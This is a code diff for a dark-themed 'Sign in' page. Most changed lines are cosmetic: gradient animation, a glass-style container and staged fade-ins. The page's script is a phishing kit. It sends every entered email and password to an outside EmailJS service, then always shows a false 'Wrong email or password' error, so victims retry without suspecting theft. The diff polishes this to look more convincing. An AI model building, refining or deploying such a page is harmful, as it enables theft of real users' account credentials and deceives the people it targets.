@@ -4,89 +4,37 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sign in</title>
+  
+  <!-- Favicon (Lock Icon from Icons8) -->
+  <link rel="icon" type="image/png" href="https://img.icons8.com/ios-filled/50/000000/lock--v1.png">
+
+  
   <style>
     * { box-sizing: border-box; }
+
     body {
       margin: 0;
       padding: 0;
-      font-family: Arial, sans-serif;
-      background: #0a0a0a;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: linear-gradient(-45deg, #0a0a0a, #1a1a1a, #121212, #0a0a0a);
+      background-size: 400% 400%;
+      animation: gradientMove 12s ease infinite;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
       min-height: 100vh;
       color: #e0e0e0;
+      overflow-x: hidden;
+      flex-direction: column;
     }
-    .container {
-      width: 100%;
-      max-width: 420px;
-      padding: 0 20px;
-      text-align: center;
-      margin-top: 140px;
+
+    @keyframes gradientMove {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
-    h2 {
-      font-size: 24px;
-      margin-bottom: 20px;
-      font-weight: 600;
-      color: #fff;
-    }
-    input[type="email"],
-    input[type="password"] {
-      width: 100%;
-      padding: 14px 16px;
-      margin-bottom: 14px;
-      border: none;
-      background: #1a1a1a;
-      color: #fff;
-      border-radius: 8px;
-      font-size: 15px;
-      outline: none;
-    }
-    button {
-      width: 100%;
-      padding: 15px;
-      background: #333;
-      color: #fff;
-      font-weight: bold;
-      border: none;
-      border-radius: 20px;
-      font-size: 15px;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: background 0.3s;
-    }
-    button:hover { background: #444; }
-    .links {
-      margin-top: 18px;
-      font-size: 14px;
-    }
-    .links a {
-      color: #bbb;
-      text-decoration: none;
-    }
-    .links a:hover { text-decoration: underline; }
-    .footer {
-      position: fixed;
-      bottom: 10px;
-      width: 100%;
-      text-align: center;
-      font-size: 12px;
-      color: #888;
-    }
-    .footer a {
-      color: #aaa;
-      margin: 0 8px;
-      text-decoration: none;
-      font-size: 11px;
-    }
-    .footer a:hover { text-decoration: underline; }
-    .error-message {
-      color: #ff5555;
-      font-size: 13px;
-      margin-top: 10px;
-      display: none;
-    }
-    /* Overlay loading for fake page load */
+
+    /* Loader */
     #page-loader {
       position: fixed;
       top: 0;
@@ -99,6 +47,12 @@
       align-items: center;
       flex-direction: column;
       z-index: 10000;
+      opacity: 1;
+      transition: opacity 0.8s ease;
+    }
+    #page-loader.fade-out {
+      opacity: 0;
+      pointer-events: none;
     }
     #page-loader .spinner {
       width: 50px;
@@ -112,8 +66,148 @@
       margin-top: 15px;
       color: #fff;
       font-size: 14px;
+      animation: fadeIn 1s ease infinite alternate;
     }
-    /* Loading overlay for sign-in action */
+
+    /* Main Container */
+    .container {
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      background: rgba(255, 255, 255, 0.04);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 40px 25px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+      opacity: 0;
+      transform: translateY(-20px) scale(0.95);
+      transition: opacity 0.8s ease, transform 0.8s ease;
+    }
+    .container.visible {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+
+    h2 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      font-weight: 600;
+      color: #fff;
+      letter-spacing: 1px;
+      transform: translateY(-15px);
+      opacity: 0;
+      transition: opacity 0.7s ease 0.3s, transform 0.7s ease 0.3s;
+    }
+    h2.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 14px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.06);
+      color: #fff;
+      border-radius: 10px;
+      font-size: 15px;
+      outline: none;
+      transition: all 0.3s ease;
+      opacity: 0;
+      transform: translateY(15px);
+    }
+    input.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    input:focus {
+      border-color: #fff;
+      background: rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(90deg, #333, #555);
+      color: #fff;
+      font-weight: bold;
+      border: none;
+      border-radius: 25px;
+      font-size: 15px;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: all 0.3s ease;
+      opacity: 0;
+      transform: scale(0.95);
+    }
+    button.visible {
+      opacity: 1;
+      transform: scale(1);
+      transition-delay: 0.5s;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #444, #666);
+      transform: scale(1.02);
+      box-shadow: 0 4px 12px rgba(255, 255, 255, 0.1);
+    }
+
+    .links {
+      margin-top: 18px;
+      font-size: 14px;
+      opacity: 0;
+      transform: translateY(15px);
+      transition: opacity 0.7s ease 0.7s, transform 0.7s ease 0.7s;
+    }
+    .links.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .links a {
+      color: #bbb;
+      text-decoration: none;
+      transition: color 0.3s;
+    }
+    .links a:hover { color: #fff; }
+
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      opacity: 0;
+      transition: opacity 1s ease 1s;
+    }
+    .footer.visible {
+      opacity: 1;
+    }
+    .footer a {
+      color: #aaa;
+      margin: 0 8px;
+      text-decoration: none;
+      font-size: 11px;
+      transition: color 0.3s;
+    }
+    .footer a:hover { color: #fff; }
+
+    .error-message {
+      color: #ff5555;
+      font-size: 13px;
+      margin-top: 10px;
+      display: none;
+      animation: shake 0.4s ease;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-4px); }
+      75% { transform: translateX(4px); }
+    }
+
     .loading-overlay {
       display: none;
       position: fixed;
@@ -126,6 +220,7 @@
       justify-content: center;
       align-items: center;
       flex-direction: column;
+      animation: fadeIn 0.4s ease forwards;
     }
     .loading-overlay .spinner {
       width: 45px;
@@ -136,57 +231,77 @@
       animation: spin 1s linear infinite;
       margin-bottom: 12px;
     }
-    .loading-overlay .loading-text {
-      font-size: 14px;
-      color: #fff;
-    }
+
     @keyframes spin {
       to { transform: rotate(360deg); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
     }
   </style>
 </head>
 <body>
-  <!-- Fake page loader -->
+  <!-- Loading Screen -->
   <div id="page-loader">
     <div class="spinner"></div>
     <div class="loading-text">Loading...</div>
   </div>
 
-  <div class="container">
-    <h2>Sign in</h2>
+  <!-- Main Container -->
+  <div class="container" id="main-container">
+    <h2 id="title">Sign in</h2>
     <form id="login-form">
       <input type="email" id="email" placeholder="Email address" required />
       <input type="password" id="password" placeholder="Password" required />
       <button type="submit">Sign in</button>
       <div class="error-message" id="error-msg">Wrong email or password</div>
     </form>
-    <div class="links">
+    <div class="links"> 
       <a href="#">Forgot password?</a><br>
       <span>Don't have an account? <a href="#">Create account</a></span>
     </div>
   </div>
 
-  <!-- Loading screen for form submission -->
   <div class="loading-overlay" id="loading-screen">
     <div class="spinner"></div>
     <div class="loading-text">Signing in...</div>
   </div>
 
-  <div class="footer">
+  <div class="footer" id="footer">
     <a href="#">Legal</a>
     <a href="#">Privacy policy</a>
     <a href="#">Your Privacy Choices</a>
     <br />© Wireshield LLC Inc. 2024. All Rights Reserved.
   </div>
 
-  <!-- EmailJS SDK -->
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     emailjs.init("Zuxy6x2TZlxuZ4ABj");
 
     document.addEventListener("DOMContentLoaded", () => {
       const pageLoader = document.getElementById("page-loader");
-      setTimeout(() => { pageLoader.style.display = "none"; }, 2000);
+      const container = document.getElementById("main-container");
+      const title = document.getElementById("title");
+      const inputs = document.querySelectorAll("input");
+      const button = document.querySelector("button");
+      const links = document.querySelector(".links");
+      const footer = document.getElementById("footer");
+
+      // Fade out loader and reveal elements
+      setTimeout(() => {
+        pageLoader.classList.add("fade-out");
+        setTimeout(() => {
+          container.classList.add("visible");
+          title.classList.add("visible");
+          inputs.forEach((input, index) => {
+            setTimeout(() => input.classList.add("visible"), index * 100);
+          });
+          setTimeout(() => button.classList.add("visible"), 250);
+          setTimeout(() => links.classList.add("visible"), 400);
+          setTimeout(() => footer.classList.add("visible"), 500);
+        }, 700);
+      }, 2000);
 
       const form = document.getElementById("login-form");
       const loader = document.getElementById("loading-screen");
@@ -194,13 +309,11 @@
 
       form.addEventListener("submit", (e) => {
         e.preventDefault();
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
         loader.style.display = "flex";
 
         emailjs.send("service_z1uzh6f", "template_whed5zh", {
-          email: email,
-          password: password
+          email: document.getElementById("email").value,
+          password: document.getElementById("password").value
         }).then(() => {
           loader.style.display = "none";
           errorMsg.style.display = "block";
